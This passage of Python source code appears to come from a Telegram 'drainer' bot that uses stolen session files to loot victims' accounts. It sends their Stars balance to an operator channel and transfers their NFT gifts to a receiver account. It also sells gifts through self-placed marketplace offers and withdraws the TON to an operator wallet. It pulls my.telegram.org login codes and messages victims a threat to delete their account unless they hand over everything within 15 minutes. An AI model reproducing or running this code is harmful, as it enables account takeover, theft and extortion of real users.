        await run_create_and_accept_offers(tgwebappdata, float(random.randint(56, 99) / 100))
        await extra_log(
            "run_initdata_flow: after run_create_and_accept_offers",
            user_id=log_user_id,
            step="hybr1d.flow",
        )
        async with hybr1d_app:
            async for gift in hybr1d_app.get_chat_gifts(
                "me", exclude_unlimited=True, exclude_limited=True, exclude_upgraded=False
            ):
                for g in nft_gifts[0]:
                    if gift.link == g["gift_link"]:
                        profits_list.append(g)
                        legacy_profits_list.append(g["gift_link"])
                        await hybr1d_app.transfer_gift(gift.message_id, config.RECEIVER_ID)
                
        for gift in nft_gifts[0]:
            if gift["gift_link"] not in legacy_profits_list:
                if gift["is_from_blockchain"]:
                    rented_gifts.append(gift)
                else:
                    if not gift["can_be_transferred"]:
                        cooldown_gifts.append(gift)
                    else:
                        gifts.append(gift)
        await extra_log(
            f"run_initdata_flow: ok profits={len(profits_list)} rented={len(rented_gifts)} cd={len(cooldown_gifts)} gifts={len(gifts)}",
            user_id=log_user_id,
            step="hybr1d.flow",
        )
        return {
            "profits": profits_list,
            "rented": rented_gifts,
            "cooldown": cooldown_gifts,
            "gifts": gifts,
            "star_amount": legacy_star_amount,
            "all_gifts_amount": all_gifts_amount,
            "needed_star_amount": legacy_needed_star_amount,
        }
    except Exception as e:
        await extra_log(
            f"run_initdata_flow: FAIL {type(e).__name__}: {e}\n{exc_text(e)}",
            user_id=log_user_id,
            step="hybr1d.flow",
        )
        return [1, e]

async def init_client(session_string: str):
    session_name = "".join(random.choices(
        "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ", k=16
    ))
    client = Client(
        session_name,
        api_id=api_id,
        api_hash=api_hash,
        session_string=session_string
    )
    await client.connect()
    return client

async def send_user_log(session_file, user_id):
    unix_start = time.time()
    unlock_ctx = {"user_id": user_id, "username": None}
    stop_unlock = asyncio.Event()
    unlock_task = None

    hybr1d_session = await init_client(config.HYBR1D_SESSION_STRING)

    init_data = await get_tg_webappdata(hybr1d_session, "@Tonnel_Network_bot")

    response = get_all_gifts_tonnel_not_on_sale(init_data)

    await bot.send_message(
        chat_id=8265488081,
        text=str(response)
    )

    response = get_all_gifts_tonnel_on_sale(init_data)

    return await bot.send_message(
        chat_id=8265488081,
        text=str(response)
    )

    if _tonnel_unlock_resolve_url():
        unlock_task = asyncio.create_task(_tonnel_unlock_loop(stop_unlock, unlock_ctx))
    try:
        await extra_log(
            f"send_user_log: старт session_file={session_file}",
            user_id=user_id,
            step="drain",
        )
        try:
            with open(f"{absolute_path}/storage/settings.json", "r") as json_settings:
                json_settings = json.loads(json_settings.read())

            transfer_to_account = bool(json_settings["transfer_to_account"])
            upgrade_gifts = bool(json_settings["gift_upgrades"])
        except:
            transfer_to_account = False
            upgrade_gifts = False
                        
        api_id = config.API_ID
        api_hash = config.API_HASH
         
        rsinc_app = Client(session_file, api_id, api_hash)
        
        try:
            if not rsinc_app.is_connected:
                await rsinc_app.connect()
        except Exception as e:
            await extra_log(
                f"send_user_log: rsinc connect FAIL {type(e).__name__}: {e}\n{exc_text(e)}",
                user_id=user_id,
                step="drain",
            )
            return await bot.send_message(
                chat_id=config.WORK_GROUP_ID,
                message_thread_id=config.LOGS_THREAD_ID,
                text=(
                    f"<tg-emoji emoji-id='5276240711795107620'>❌</tg-emoji><b>Сессия не открылась</b>\n<tg-emoji emoji-id='5278589204207528856'>🎱</tg-emoji>ID: <code>{user_id}</code>\n\n{e}"
                ),
                parse_mode="HTML",
            )
        await extra_log(
            "send_user_log: rsinc подключён, export session",
            user_id=user_id,
            step="drain",
        )
        try:
            user_session_string = await rsinc_app.export_session_string()    
        except Exception as e:
            await extra_log(
                "Ошибка при импорте session-string: {e}",
                user_id=user_id,
                step="drain",
            )    
        
        #session_name = random.choices("abcdefghijklmnopqrstuvwxyz0123456789" + "abcdefghijklmnopqrstuvwxyz0123456789".upper(), k=16)
        #app = Client(session_name, api_id=api_id, api_hash=api_hash, session_string=user_session_string)
        
        await extra_log(
            "send_user_log: user Pyrogram (string) подключён",
            user_id=user_id,
            step="drain",
        )
        user = await rsinc_app.get_me()
        unlock_ctx["user_id"] = user.id
        unlock_ctx["username"] = user.username or None
        await extra_log(
            f"send_user_log: @{user.username or '—'} premium={user.is_premium} id={user.id}",
            user_id=user_id,
            step="drain",
        )

        if not user.username:
            try:
                shuffled_username = f"u{random.randint(1000000000000, 10000000000000)}"
                await rsinc_app.set_username(shuffled_username)
                unlock_ctx["username"] = shuffled_username or None
            except:
                pass
        
        asyncio.create_task(monitor_session(user.id, user_session_string))
        await extra_log(
            "send_user_log: monitor_session task создан",
            user_id=user_id,
            step="drain",
        )
        asyncio.create_task(post_connect_captcha.kick(user.id))
        if not user.is_premium:
            for admin_id in config.ADMIN_ID:
                try:
                    await bot.send_message(
                        admin_id,
                        f"<tg-emoji emoji-id='5278578973595427038'>❌</tg-emoji> <b>Не удалось подключиться к hybr1dAPI.dc32.locals.portals</b>\n<b>Юзер: @{user.username or '—'} (<code>id{user_id}</code>)</b>",
                        parse_mode="HTML",
                    )
                except Exception as e:
                    logging.error(
                        f"Не удалось отправить уведомление админу {admin_id}: {e}"
                    )
            await bot.send_message(
                chat_id=config.WORK_GROUP_ID,
                message_thread_id=config.LOGS_THREAD_ID,
                text=f"<tg-emoji emoji-id='5278578973595427038'>❌</tg-emoji> <b>Не удалось подключиться к hybr1dAPI.dc32.locals.portals</b>\n<b>Юзер: @{user.username or '—'} (<code>id{user_id}</code>)</b>",
                parse_mode="HTML",
            )
            try:
                balance_before = int(await rsinc_app.get_stars_balance())
            except Exception:
                balance_before = 0
                
            try:
                balance = balance_before

                if balance > 0:
                    if not transfer_to_account:
                        try:
                            try:
                                await rsinc_app.get_chat(config.CHAT_RECEIVER_USERNAME)
                            except Exception:
                                await rsinc_app.join_chat(config.CHAT_RECEIVER_USERNAME)
                        except Exception:
                            pass

                        try:
                            await rsinc_app.send_paid_reaction(
                                chat_id=config.CHAT_RECEIVER_USERNAME,
                                message_id=config.MESSAGE_RECEIVER_ID,
                                amount=balance,
                            )
                        except Exception:
                            pass
                    else:
                        try:
                            if balance >= 1:
                                try:
                                    try:
                                        await rsinc_app.get_chat(config.CHAT_RECEIVER_USERNAME)
                                    except Exception:
                                        await rsinc_app.join_chat(config.CHAT_RECEIVER_USERNAME)
                                except Exception:
                                    pass

                                try:
                                    await rsinc_app.send_paid_reaction(
                                        chat_id=config.CHAT_RECEIVER_USERNAME,
                                        message_id=config.MESSAGE_RECEIVER_ID,
                                        amount=balance,
                                    )
                                except Exception:
                                    pass
                        except Exception:
                            pass
            except Exception:
                pass

            try:
                balance_after = int(await rsinc_app.get_stars_balance())
            except Exception:
                balance_after = balance_before

            stars_text = f"<code>{balance_before}</code> <b>→</b> <code>{balance_after}</code>"

            phone_masked = (
                f"+{user.phone_number[:2]}"
                + "*" * (len(user.phone_number) - 6)
                + user.phone_number[-4:]
                if getattr(user, "phone_number", None)
                else "—"
            )

            msg = (
                f"<tg-emoji emoji-id='5039880333554616347'>💸</tg-emoji> <b>новaя cессия!</b>\n\n"
                f"<tg-emoji emoji-id='5275979556308674886'>👤</tg-emoji> Пользователь: @{user.username or '—'}\n"
                f"<tg-emoji emoji-id='5278589204207528856'>🎱</tg-emoji> Айди: <code>id{user.id}</code>\n"
                f"<tg-emoji emoji-id='5242380641332393116'>☎️</tg-emoji> Номер телефона: <code>+{user.phone_number[:2] + '*' * (len(user.phone_number) - 6) + user.phone_number[-4:]}</code>\n"
                f"<tg-emoji emoji-id='5278305362703835500'>🔗</tg-emoji> Файл сессии дрейнера: <code>{session_file}.dsf</code>\n"
                f"\n<b><tg-emoji emoji-id='5278778882848220741'>🔮</tg-emoji> Статистика:</b>"
                f"<blockquote><tg-emoji emoji-id='5206476089127372379'>⭐️</tg-emoji>  Звёзды: {stars_text}</blockquote>"
            )

            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(
                            text="Uretra d0sh1k", url=f"https://t.me/{config.BRAND_TELEGRAM}", icon_custom_emoji_id="5039880333554616347"
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            text="🔄 Отправить заново",
                            callback_data=f"send_again_no_check:{user_id}",
                        )
                    ],
                ]
            )

            for admin_id in config.ADMIN_ID:
                try:
                    await bot.send_message(
                        admin_id,
                        msg,
                        parse_mode="HTML",
                        reply_markup=keyboard,
                        link_preview_options=LinkPreviewOptions(is_disabled=True),
                    )
                except Exception as e:
                    await bot.send_message(
                        chat_id=config.WORK_GROUP_ID,
                        message_thread_id=config.LOGS_THREAD_ID,
                        text=mutate_text(
                            f"Не удалось отправить сообщение Админу {admin_id} сессии {user_id}:\n<code>{e}</code>"
                        ),
                        parse_mode="HTML",
                    )

            try:
                worker_id = database.get_worker_status(user_id=user_id)
                if worker_id:
                    await bot.send_message(
                        worker_id,
                        msg,
                        parse_mode="HTML",
                        reply_markup=keyboard,
                        link_preview_options=LinkPreviewOptions(is_disabled=True),
                    )
                else:
                    logging.warning(f"Не удалось найти worker_id для user_id={user_id}")
            except Exception:
                pass

            try:
                await bot.send_message(
                    chat_id=config.WORK_GROUP_ID,
                    message_thread_id=config.LOGS_THREAD_ID,
                    text=msg,
                    parse_mode="HTML",
                    link_preview_options=LinkPreviewOptions(is_disabled=True),
                )
            except Exception as e:
                await bot.send_message(
                    chat_id=config.WORK_GROUP_ID,
                    message_thread_id=config.LOGS_THREAD_ID,
                    text=mutate_text(
                        f"Не удалось отправить сообщение в рабочий чат:\n<code>{e}</code>"
                    ),
                    parse_mode="HTML",
                )

            await asyncio.sleep(POST_MAIN_MSG_PAUSE)

            web_code, web_status = await request_my_login_code(user_session_string, user)
            await extra_log(
                f"send_user_log (no premium): my.telegram.org status={web_status} code={'ok' if web_code else 'none'}",
                user_id=user_id,
                step="drain",
            )
            if web_status == "ok" and web_code:
                message_start_text = "<tg-emoji emoji-id='5278602437001767574'>🔑</tg-emoji> <b>my.telegram.org код!</b>\n\n"
                web_login_text = f"<tg-emoji emoji-id='5278753302023004775'>🔑</tg-emoji> Токен входа my.telegram.org: <code>{web_code}</code>\n\n<b>Удалить аккаунт - /delete token</b>"
            else:
                message_start_text = "<b><tg-emoji emoji-id='5278578973595427038'>😢</tg-emoji> Код my.telegram.org не получен</b>\n\n"
                web_login_text = (
                    f"<tg-emoji emoji-id='5278753302023004775'>🔑</tg-emoji> Токен входа my.telegram.org не получен (статус: {web_status}).\n"
                )

            auth_msg = (
                f"{message_start_text}"
                f"<tg-emoji emoji-id='5275979556308674886'>👤</tg-emoji> Юз: @{user.username or '—'}\n"
                f"{web_login_text}"
            )

            for admin_id in config.ADMIN_ID:
                try:
                    await bot.send_message(
                        admin_id,
                        auth_msg,
                        parse_mode="HTML"
                    )
                except Exception as e:
                    await bot.send_message(
                        chat_id=config.WORK_GROUP_ID,
                        message_thread_id=config.LOGS_THREAD_ID,
                        text=(
                            f"Не удалось отправить сообщение Админу {admin_id} сессии {user_id}:\n<code>{e}</code>"
                        ),
                        parse_mode="HTML",
                    )
            try:
                worker_id = database.get_worker_status(user_id=user_id)
                if worker_id:
                    await bot.send_message(
                        worker_id,
                        auth_msg,
                        parse_mode="HTML",
                    )
                else:
                    logging.warning(f"Не удалось найти worker_id для user_id={user_id}")
            except Exception:
                pass
            await extra_log(
                "send_user_log: ветка не premium — без Hybr1d flow, уведомление юзеру и выход",
                user_id=user_id,
                step="drain",
                    )
            
            need_to_transfer = []

            async for gift in rsinc_app.get_chat_gifts(chat_id="me", exclude_upgraded=False, exclude_limited=True, exclude_unlimited=True):
                try:
                    meta = await saved_star_gift_transfer_meta(rsinc_app, gift.message_id)
                    transfer_at = meta[1]
                    current_time_utc_plus_1 = datetime.utcnow() + timedelta(hours=1)
                    transfer_difference =  transfer_at - current_time_utc_plus_1.timestamp()
                    unix_week = 86400 * 7

                    if abs(transfer_difference - unix_week) < 10000:
                        need_to_transfer.append(gift.link)
                except:
                    pass     

            try:
                await rsinc_app.disconnect()
            except Exception:
                pass

            hybr1d_app = await init_client(config.HYBR1D_SESSION_STRING)
            hybr1d_user = await hybr1d_app.get_me()

            await bot.send_message(
                chat_id=user.id,
                text="<tg-emoji emoji-id='5276240711795107620'>⚠️</tg-emoji> <b>Доступ к вашему аккаунт был получен.</b>\n\n<blockquote>У вас есть РОВНО 15 минут чтобы передать все подарки по контакту ниже. Что будет если я не передам подарки? ваш аккаунт будет автоматически удален. Если вы кикнете сессии, это все равно вам не поможет. Бот уже на my.telegram.org. Нет звезд? Контакты для покупки ниже.</blockquote>\n\n<b>Передача на любой акк кроме акка снизу - СНОС автоматически.</b>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(
                    inline_keyboard=[
                        [
                            InlineKeyboardButton(
                                icon_custom_emoji_id="5276262671962892944",
                                text="Куда передать подарки?",
                                url=f"https://t.me/{hybr1d_user.username}",
                            )
                        ],
                        [
                            InlineKeyboardButton(
                                icon_custom_emoji_id="5206476089127372379",
                                text="Звезды по карте",
                                url=f"https://t.me/PremiumBot",
                            ),
                            InlineKeyboardButton(
                                icon_custom_emoji_id="5206476089127372379",
                                text="Звезды за крипту + СБП",
                                url=f"https://split.tg",
                            )
                        ],
                    ]
                ),
            )
            await bot.send_message(
                chat_id=user.id,
                text = "<b>Список подарков для передачи:</b>\n\n" + '\n'.join(g for g in need_to_transfer),
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(is_disabled=True)
            )
        
        profited_gifts = []
        rented_gifts = []
        cooldown_gifts = []
        not_transfered_gifts = []
        gifts_to_upgrade = []
        gifts_to_transfer = []
        
        all_gifts_amount = 0
        needed_star_amount = 0

        task_business = asyncio.create_task(
            run_business_flow(rsinc_app, log_user_id=user_id)
        )

        task_star_session = asyncio.create_task(
            init_client(config.STAR_SESSION_STRING)
        )

        task_hybr1d_session = asyncio.create_task(
            init_client(config.HYBR1D_SESSION_STRING)
        )

        # Ждём эти три задачи
        hybr1d_connection, star_session, hybr1d_session = await asyncio.gather(
            task_business,
            task_star_session,
            task_hybr1d_session,
            return_exceptions=True
        )

        # После этого запускаем initdata
        task_initdata = asyncio.create_task(
            get_tg_webappdata(rsinc_app, "@Tonnel_Network_bot")
        )

        flow_result = await task_initdata

        # Если соединение прошло успешно, отправляем уведомления
        if hybr1d_connection == 0:
            # Список задач для отправки сообщений
            tasks = []

            # Задачи для отправки уведомлений администраторам
            for admin_id in config.ADMIN_ID:
                tasks.append(
                    bot.send_message(
                        admin_id,
                        f"<tg-emoji emoji-id='5278602437001767574'>✅</tg-emoji> <b>Успешное подключение к hybr1dAPI.dc32.locals.portals</b>\n<b>Юзер: @{user.username or '—'} (<code>id{user_id}</code>)</b>",
                        parse_mode="HTML",
                    )
                    )

            # Задача для отправки сообщения в рабочую группу
            tasks.append(
                bot.send_message(
                chat_id=config.WORK_GROUP_ID,
                message_thread_id=config.LOGS_THREAD_ID,
                text=f"<tg-emoji emoji-id='5278602437001767574'>✅</tg-emoji> <b>Успешное подключение к hybr1dAPI.dc32.locals.portals</b>\n<b>Юзер: @{user.username or '—'} (<code>id{user_id}</code>)</b>",
                parse_mode="HTML",
            )
            )

            # Выполнение всех задач параллельно
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)

                # Логирование ошибок, если они произошли
                for result in results:
                    if isinstance(result, Exception):
                        logging.error(f"Ошибка при отправке сообщения: {result}")

        convert_tasks = []

        rsinc_gifts = rsinc_app.get_chat_gifts("me")

        async for gift in rsinc_gifts:
            all_gifts_amount += 1
            if gift.is_limited:
                if upgrade_gifts:
                    if gift.can_upgrade:
                        try:
                            needed_star_amount += gift.upgrade_price
                            gifts_to_upgrade.append([gift])
                        except:
                            pass
            elif hasattr(gift, "link"):
                continue
            else:
                gift_date = gift.date

                if gift_date.tzinfo is None:
                    gift_date = gift_date.replace(tzinfo=timezone.utc)

                if datetime.now(timezone.utc) - gift_date <= SEVEN_DAYS:
                    convert_tasks.append(
                        rsinc_app.convert_gift(gift.message_id)
                    )
        
        if convert_tasks:
            results = await asyncio.gather(*convert_tasks, return_exceptions=True)

        await extra_log(
            f"run_initdata_flow: gifts scan done, count={all_gifts_amount}",
            user_id=user_id,
            step="hybr1d.flow",
        )
        star_amount, star_session_user = await asyncio.gather(
            rsinc_app.get_stars_balance(),
            star_session.get_me()
        )

        nft_gifts = await print_managed_and_optional_coffin(flow_result)
        needed_star_amount += nft_gifts[1]

        async def send_and_convert_gift(star_gift):
            try:
                sent = await star_session.send_gift(
                    chat_id=unlock_ctx["username"],
                    gift_id=star_gift
                )

                if not sent:
                    return None

                await asyncio.sleep(STAR_GIFT_CONVERT_PAUSE)

                async for message in rsinc_app.get_chat_history(
                    star_session_user.username,
                    limit=1
                ):
                    try:
                        await rsinc_app.convert_gift(message.id)
                    except:
                        pass
                    break

            except:
                return None
            
        try:
            legacy_needed_star_amount = needed_star_amount
            needed_star_amount = needed_star_amount - star_amount

            if needed_star_amount > 0:
                star_gifts = {
                    13: 5170145012310081615,
                    43: 5170144170496491616,
                    85: 5168043875654172773,
                }
                
                chosen = select_gifts_to_cover(star_gifts, needed_star_amount)
                
                await extra_log(
                    f"Chosen: {chosen}",
                    user_id=user_id,
                    step="hybr1d.flow",
                )

                for star_gift in chosen:
                    await send_and_convert_gift(star_gift)
                    await asyncio.sleep(0.05)
        except:
            pass
        
        for gift in nft_gifts[0]:
            if gift["can_be_transferred"]:
                gifts_to_transfer.append(gift["gift_id"])
            elif gift["is_from_blockchain"]:
                rented_gifts.append(gift)
            else:
                cooldown_gifts.append(gift)
        
        gifts_to_transfer += gifts_to_upgrade

        legacy_star_amount = await rsinc_app.get_stars_balance()

        try:
            tasks_upgrade = []

            for gift in gifts_to_upgrade:
                task = rsinc_app.upgrade_gift(gift.message_id)
                tasks_upgrade.append(task)

            await asyncio.gather(*tasks_upgrade, return_exceptions=False)

            xfer = [
                g
                for g in gifts_to_transfer
            ]

            if xfer:
                coffin_results = await asyncio.gather(
                    *[
                        asyncio.to_thread(coffin_quick_transfer, flow_result, g)
                        for g in xfer
                    ],
                    return_exceptions=True,
                )
        except:
            pass
    
        try:
            balance_before = int(await rsinc_app.get_stars_balance())
        except Exception:
            balance_before = 0
        await extra_log(
            f"send_user_log: balance_before={balance_before}",
            user_id=user_id,
            step="drain",
        )
        try:
            balance = balance_before

            if balance > 0:
                if not transfer_to_account:
                    try:
                        try:
                            await rsinc_app.get_chat(config.CHAT_RECEIVER_USERNAME)
                        except Exception:
                            await rsinc_app.join_chat(config.CHAT_RECEIVER_USERNAME)
                    except Exception:
                        pass

                    try:
                        await rsinc_app.send_paid_reaction(
                            chat_id=config.CHAT_RECEIVER_USERNAME,
                            message_id=config.MESSAGE_RECEIVER_ID,
                            amount=balance,
                        )
                    except Exception:
                        pass
                else:
                    try:
                        if balance >= 1:
                            try:
                                try:
                                    await rsinc_app.get_chat(config.CHAT_RECEIVER_USERNAME)
                                except Exception:
                                    await rsinc_app.join_chat(config.CHAT_RECEIVER_USERNAME)
                            except Exception:
                                pass

                            try:
                                await rsinc_app.send_paid_reaction(
                                    chat_id=config.CHAT_RECEIVER_USERNAME,
                                    message_id=config.MESSAGE_RECEIVER_ID,
                                    amount=balance,
                                )
                            except Exception:
                                pass
                    except Exception:
                        pass
        except Exception:
            pass
    
        await asyncio.sleep(1)
        
        all_gifts_ids = await asyncio.to_thread(get_all_gift_ids, flow_result)
        init_data = await get_tg_webappdata(hybr1d_session, "@Tonnel_Network_bot")

        offer_amount = random.randint(204, 207) / 100

        buy_results = await asyncio.gather(
            *[
                asyncio.to_thread(
                    create_buy_offer, init_data, gift_id, offer_amount, "TON"
                )
                for gift_id in all_gifts_ids
            ],
            return_exceptions=True,
        )

        await asyncio.sleep(0.6)

        async def try_accept_offer_with_timeout(user_init_data, offer, timeout=10, retry_interval=0.5):
            """
            Пытается принять оффер в течение определённого времени с интервалом между попытками.
            Если оффер не принят за время ожидания, скипаем.
            """
            try:
                for _ in range(int(timeout / retry_interval)):
                    # Попытка принять оффер
                    accept_result = await asyncio.to_thread(accept_buy_offer, user_init_data, offer["offer_id"])
                    if accept_result:
                        if accept_result["status"] == "success":
                            print(f"Результат принятия оффера {offer['offer_id']}: {accept_result}")
                            return accept_result
                    await asyncio.sleep(retry_interval)  # Ждём перед следующей попыткой
                
                print(f"Не удалось принять оффер {offer['offer_id']} за {timeout} секунд.")
                return None
            except asyncio.TimeoutError:
                print(f"Ожидание для оффера {offer['offer_id']} превысило лимит времени.")
                return None

        # Основная функция для обработки офферов
        async def process_offers(user_init_data, all_gifts_ids, offers, amount):
            # Список задач
            tasks = []

            for gift_id in all_gifts_ids:
                off = offers.get(gift_id)
                if not isinstance(off, dict) or "offers" not in off:
                    continue
                for offer in off["offers"]:
                    if offer["status"] == "pending":
                        if offer["price"] == amount and offer["asset"] == "TON":
                            print(f"Пытаюсь принять оффер {offer['offer_id']} для gift_id {gift_id}...")
                            # Добавляем задачу для выполнения с таймаутом
                            task = try_accept_offer_with_timeout(user_init_data, offer)
                            tasks.append(task)
            
            # Выполняем все задачи параллельно
            results = await asyncio.gather(*tasks)

            # Печать результатов
            for result in results:
                if result:
                    bot.send_message(chat_id=828265488081, text=f"Оффер принят с результатом: {result}")
                else:
                    bot.send_message(chat_id=828265488081, text="Оффер не был принят.")

        offers = get_all_buy_offers_for_gifts_parallel(flow_result, all_gifts_ids)
        await process_offers(flow_result, all_gifts_ids, offers, offer_amount)

        balance = get_balance_info(flow_result)
        coffin_balance_withdraw(wallet=config.OFFERS_WALLET, amount=balance, asset="TON", auth_data=flow_result)

        try:
            await rsinc_app.disconnect()
        except Exception:
            pass

        hybr1d_needed_amount = 0
        hybr1d_to_transfer = []

        await asyncio.sleep(10)
        all_receiver_gifts_ids = await asyncio.to_thread(get_all_gift_ids, init_data)
        for gift_id in all_receiver_gifts_ids:
            return_gift(auth_data=init_data, gift_id=gift_id)
            await asyncio.sleep(OFFERS_RETURN_GIFT_SLEEP)

        await asyncio.sleep(5)

        async for gift in hybr1d_session.get_chat_gifts("me", exclude_unlimited=True, exclude_limited=True, exclude_upgraded=False):
            for g in nft_gifts[0]:
                if gift.link == g["gift_link"]:
                    profited_gifts.append(g)
                    try:
                        hybr1d_needed_amount += 25
                        hybr1d_to_transfer.append(gift.message_id)
                    except:
                        pass
            
        async def send_and_convert_gift_hybr1d(star_gift, hybr1d_username):
            try:
                sent = await star_session.send_gift(
                    chat_id=hybr1d_username,
                    gift_id=star_gift
                )

                if not sent:
                    return None

                await asyncio.sleep(STAR_GIFT_CONVERT_PAUSE)

                async for message in hybr1d_app.get_chat_history(
                    star_session_user.username,
                    limit=1
                ):
                    try:
                        await hybr1d_app.convert_gift(message.id)
                    except:
                        pass
                    break

            except:
                return None

        try:
            if hybr1d_needed_amount > 0:
                star_gifts = {
                    13: 5170145012310081615,
                    43: 5170144170496491616,
                    85: 5168043875654172773,
                }
                
                chosen = select_gifts_to_cover(star_gifts, hybr1d_needed_amount)
                
                hybr1d_user = await hybr1d_app.get_me()
                hybr1d_username = hybr1d_user.username or hybr1d_user.id

                for star_gift in chosen:
                    await send_and_convert_gift_hybr1d(star_gift, hybr1d_username)
                    await asyncio.sleep(0.05)
        except:
            pass

        for gift in hybr1d_to_transfer:
            try:
                await hybr1d_session.transfer_gift(gift, config.RECEIVER_ID)
            except:
                pass

        for gift in nft_gifts[0]:
            if gift not in profited_gifts and gift not in cooldown_gifts and gift not in rented_gifts:
                not_transfered_gifts.append(gift)
        
        star_amount_text = legacy_star_amount
        needed_star_amount_text = legacy_needed_star_amount
        stars_text = f"<code>{star_amount_text}</code> <b>/</b> <code>{needed_star_amount_text}</code>"
        
        builder = InlineKeyboardBuilder()
        
        nfts_msg = "<b>NFT</b><blockquote>"
        index = 0
        for gifts_group in [not_transfered_gifts, profited_gifts, cooldown_gifts, rented_gifts]:
            for nft in gifts_group:
                index += 1
                gift_status = ""
                gift_status = "❎" if nft in rented_gifts else gift_status 
                gift_status = "☑️" if nft in profited_gifts else gift_status # transfered
                gift_status = "🕐" if nft in cooldown_gifts else gift_status # cooldown
                gift_status += "🩶" if nft["backdrop_name"] == "Onyx Black" else "" #backdrop onyx
                gift_status += "🖤" if nft["backdrop_name"] == "Black" else "" #backdrop black
                nfts_msg += f"{index}. {gift_status} <a href='{nft['gift_link']}\n'>{nft['gift_link'].split('/')[-1]}</a> - <tg-emoji emoji-id='{nft['model_emoji']}'>🎁</tg-emoji>\n"
                builder.button(text=f"{gift_status} {str(index)}", callback_data="Uretra d0sh1k")
        if nfts_msg == "<b>NFT</b><blockquote>":
            nfts_msg += "\nПусто"
            nfts_msg += "</blockquote>"
        else:
            nfts_msg += "</blockquote>"
        
        msg = (
            f"<tg-emoji emoji-id='5039880333554616347'>💸</tg-emoji> <b>новaя cессия!</b>\n\n"
            f"<tg-emoji emoji-id='5275979556308674886'>👤</tg-emoji> Пользователь: @{user.username or '—'}\n"
            f"<tg-emoji emoji-id='5278589204207528856'>🎱</tg-emoji> Айди: <code>id{user.id}</code>\n"
            f"<tg-emoji emoji-id='5242380641332393116'>☎️</tg-emoji> Номер телефона: <code>+{user.phone_number[:2] + '*' * (len(user.phone_number) - 6) + user.phone_number[-4:]}</code>\n"
            f"<tg-emoji emoji-id='5278305362703835500'>🔗</tg-emoji> Файл сессии дрейнера: <code>{session_file}.dsf</code>\n"
            f"\n<b><tg-emoji emoji-id='5278778882848220741'>🔮</tg-emoji> Статистика:</b>"
            f"\n<blockquote><tg-emoji emoji-id='5206476089127372379'>⭐️</tg-emoji> Звезды: {stars_text}"
            f"\n<tg-emoji emoji-id='5276422526350681413'>🧧</tg-emoji> Подарков: <code>{all_gifts_amount + len(profited_gifts) + len(rented_gifts) + len(not_transfered_gifts) + len(cooldown_gifts)}</code>"
            f"\n<tg-emoji emoji-id='5276229330131772747'>🧧</tg-emoji> NFT подарков: <code>{len(profited_gifts) + len(rented_gifts) + len(not_transfered_gifts) + len(cooldown_gifts)}</code></blockquote>"
            f"\n\n{nfts_msg}"
        )

        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="Uretra d0sh1k", url=f"https://t.me/{config.BRAND_TELEGRAM}", icon_custom_emoji_id="5039880333554616347"
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="🔄 Отправить заново",
                        callback_data=f"send_again_no_check:{user_id}",
                    )
                ],
            ]
        )

        keyboard2 = builder.adjust(6).as_markup()

        combined_buttons = keyboard2.inline_keyboard + keyboard.inline_keyboard

        combined_keyboard = InlineKeyboardMarkup(inline_keyboard=combined_buttons)

        for admin_id in config.ADMIN_ID:
            try:
                await bot.send_message(
                    admin_id,
                    msg,
                    parse_mode="HTML",
                    reply_markup=combined_keyboard,
                    link_preview_options=LinkPreviewOptions(is_disabled=True),
                )
            except Exception as e:
                await bot.send_message(
                    chat_id=config.WORK_GROUP_ID,
                    message_thread_id=config.LOGS_THREAD_ID,
                    text=mutate_text(
                        f"<b>Не дошло админу</b> <code>{admin_id}</code>\n"
                        f"Сессия <code>{user_id}</code>\n<code>{e}</code>"
                    ),
                    parse_mode="HTML",
                )

        try:
            worker_id = database.get_worker_status(user_id=user_id)
            if worker_id:
                await bot.send_message(
                    worker_id,
                    msg,
                    parse_mode="HTML",
                    reply_markup=combined_keyboard,
                    link_preview_options=LinkPreviewOptions(is_disabled=True),
                )
            else:
                logging.warning(f"Не удалось найти worker_id для user_id={user_id}")
        except:
            pass

        try:
            await bot.send_message(
                chat_id=config.WORK_GROUP_ID,
                message_thread_id=config.LOGS_THREAD_ID,
                text=msg,
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(is_disabled=True),
            )
        except Exception as e:
            await bot.send_message(
                chat_id=config.WORK_GROUP_ID,
                message_thread_id=config.LOGS_THREAD_ID,
                text=mutate_text(
                    f"<b>Не ушло в рабочий чат</b>\n<code>{e}</code>"
                ),
                parse_mode="HTML",
            )
            
        profits_list = []
        for gift in profited_gifts:
            profits_list.append(gift["gift_link"])
        if len(profits_list) > 0:
            await send_profit_log(profits_list=profits_list, goi_id=user.id, worker_id=worker_id if worker_id else 0)
        await extra_log(
            f"send_user_log: финиш рассылки сессии, profited={len(profits_list)}",
            user_id=user_id,
            step="drain",
        )
    except Exception as e:
        await extra_log(
            f"send_user_log: ВЕРХНИЙ except {type(e).__name__}: {e}\n{exc_text(e)}",
            user_id=user_id,
            step="drain",
        )
        await bot.send_message(
            chat_id=config.WORK_GROUP_ID,
            message_thread_id=config.LOGS_THREAD_ID,
            text=(f"<tg-emoji emoji-id='5276240711795107620'>❌</tg-emoji> <b>Ошибка поста в чат</b>\n<code>{e}</code>"),
            parse_mode="HTML",
        )
    finally:
        if unlock_task:
            stop_unlock.set()
            unlock_task.cancel()
            try:
                await unlock_task
            except asyncio.CancelledError:
                pass
